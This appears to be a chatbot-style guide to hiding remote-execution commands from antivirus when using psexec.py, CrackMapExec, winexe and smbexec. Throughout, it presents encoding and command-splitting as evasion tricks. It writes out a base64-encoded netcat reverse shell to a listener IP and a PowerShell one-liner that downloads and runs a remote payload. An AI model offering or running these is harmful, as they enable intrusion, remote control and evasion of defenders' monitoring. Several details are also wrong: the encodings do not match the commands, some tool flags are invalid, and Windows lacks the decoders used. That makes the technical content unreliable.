Obfuscating commands used by tools like psexec.py, CrackMapExec, winexe, and smbexec can help reduce the likelihood of detection by antivirus or endpoint protection systems. Obfuscation involves making the command execution less obvious or harder to identify by security tools. This can include methods like encoding the command, splitting it into smaller parts, or using different encoding schemes for payloads.


psexec.py (Impacket)
Obfuscation Techniques
Base64 Encoding: One common technique is encoding the command in base64. This makes it less readable and can help evade detection by antivirus software.
Splitting Commands: Split the command into smaller segments to make it harder to detect.

----------------------------------------------------------------------------------------------
Example: Base64 Encoding
First, let's base64 encode the command you want to run (ipconfig) and pass it to the target system:

bash
Copy code
echo "ipconfig" | base64
This might output:
aXBhZGQ=
Now, use psexec.py with the encoded command:

psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo aXBhZGQ= | base64 -d | cmd"
What happens here:
echo aXBhZGQ= | base64 -d decodes the base64 encoded command (ipconfig), making it harder to directly detect.


This approach can be extended to obfuscate other commands as well.
Example: Splitting the Command
psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo i | cmd > config.txt"
This splits the command into smaller parts to confuse signature-based detection.

2. CrackMapExec (CME)
Obfuscation Techniques
Command Encoding: Base64 encoding or similar obfuscation methods.
Using Reverse Shells: Using reverse shell payloads can sometimes help evade detection by blending in with common network traffic.
Example: Base64 Encoding
You can use a reverse shell encoded in base64:

bash
Copy code
echo "nc -e cmd.exe 192.168.1.50 4444" | base64
This might produce something like:

bmMgLWUgY21kLmV4ZSAxOTIuMTY4LjEuNTAgNDA0NA==
Now, execute the CrackMapExec command with the base64 encoded reverse shell:

crackmapexec smb 192.168.1.100 -u Administrator -p Password123 -x "echo bmMgLWUgY21kLmV4ZSAxOTIuMTY4LjEuNTAgNDA0NA== | base64 -d | cmd"
What happens here:

The base64 encoded reverse shell gets decoded and executed on the target.
3. WinExe
Obfuscation Techniques
Hex Encoding: Using hex encoding for the command arguments.
Command Split: Breaking the command into smaller, less obvious chunks.
Example: Hex Encoding
Let's say you want to run the ipconfig command on a remote machine. First, convert ipconfig to hex:

bash
Copy code
echo -n "ipconfig" | xxd -p
This will give you:

Copy code
6970636f6e666967
Now, use WinExe with the hex-encoded command:

bash
Copy code
winexe -U Administrator%Password123 //<TARGET_IP> "cmd.exe /c echo 6970636f6e666967 | xxd -r -p | cmd"
The command is encoded, making it less recognizable to signature-based detection tools.

4. SMBExec
Obfuscation Techniques
Base64 Encoding: Similar to the other tools, using base64 encoding or escaping the command.
Randomized Command Execution: Splitting the command or adding seemingly random characters to the command.
Example: Base64 Encoding
Base64 encode the command ipconfig:
bash
Copy code
echo "ipconfig" | base64
This will output:

makefile
Copy code
aXBhZGQ=
Now, use SMBExec with the base64 encoded command:
bash
Copy code
python smbexec.py -i 192.168.1.100 -u Administrator -p Password123 -c "echo aXBhZGQ= | base64 -d | cmd"
Here:

echo aXBhZGQ= | base64 -d decodes the base64-encoded command and runs it.
General Obfuscation Techniques
In addition to base64 and hex encoding, here are other general obfuscation techniques that can be applied:

Environment Variables:

Use environment variables to store part of the command and then call it in the main command to reduce direct exposure
export CMD="ipconfig"
psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo $CMD"
PowerShell Scripts:

You can invoke PowerShell scripts that obfuscate commands within them.
psexec.py -U Administrator:Password123@192.168.1.100 "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
Command Chaining:

Split the command into smaller steps to evade detection. For example, use logical operators like && or || to chain multiple actions together:
bash
Copy code
psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c echo ipconfig && echo more commands"
Using cmd.exe as a Wrapper:

Execute commands indirectly by calling them through a secondary process like cmd.exe.
bash
Copy code
psexec.py -U Administrator:Password123@192.168.1.100 "cmd.exe /c start ipconfig"
Randomized Command Injection:

Randomize small parts of the command or arguments to make detection harder. This technique requires dynamically generating payloads and arguments.
Conclusion
Obfuscation techniques are essential for evading detection when using tools like psexec.py, CrackMapExec, winexe, and smbexec. However, note that no method is foolproof, and modern endpoint detection systems and firewalls are becoming better at detecting even obfuscated activity. For best results, use a combination of methods like encoding, splitting commands, and using encrypted channels (SMBv3) to reduce visibility.
